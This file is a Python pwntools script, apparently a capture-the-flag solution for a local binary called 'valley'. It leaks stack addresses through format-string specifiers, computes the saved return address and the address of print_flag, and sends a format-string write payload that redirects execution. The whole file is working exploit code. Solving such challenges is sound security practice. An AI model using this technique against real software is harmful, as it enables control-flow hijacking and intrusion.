from pwn import *

# Start the valley process
process = process('./valley')
# Clear out the welcome message
response = process.recvline()

# Grab *rbp, which is +0x8 from the echo_valley() return address on the stack
process.sendline(b'%20$p')
# Parse *rbp
response = process.recvline().decode().strip()
# Calculate return address location on the stack
hex_address = response.split(':')[-1].strip()
return_addr = int(hex_address, 16) - 0x8
print(f"Return Address Stack Location: {hex(return_addr)}")

# Grab the return address which should be main+0x12
process.sendline(b'%21$p')
# Parse main+0x12
response = process.recvline().decode().strip()
# Calculate the address of print_flag using offset
offset = 0x13f5 - 0x1269 # From assembly code
hex_address = response.split(':')[-1].strip()
print_flag_addr = int(hex_address, 16) - offset
print(f"print_flag: {hex(print_flag_addr)}")

# Create the format string payload
context.bits = 64
# format string buf is at arg 6, number of bytes written is 0, and we don't want \n in the payload
payload = fmtstr_payload(6, {return_addr: print_flag_addr}, numbwritten=0, write_size='short', badbytes=b'\n')
print(f"Payload: {payload}")

process.sendline(payload)

# Clear out junk response from the payload
while True:
    response = process.recvrepeat(0)
    if response == b'':
        break


# exit from echo_valley() to redirect to the overwritten return address (print_flag)
process.sendline(b'exit')
# Print out flag response
try:
    while True:
        response = process.recvline().decode().strip()
        print(response)
        if response == b'':
            break
except EOFError:
    pass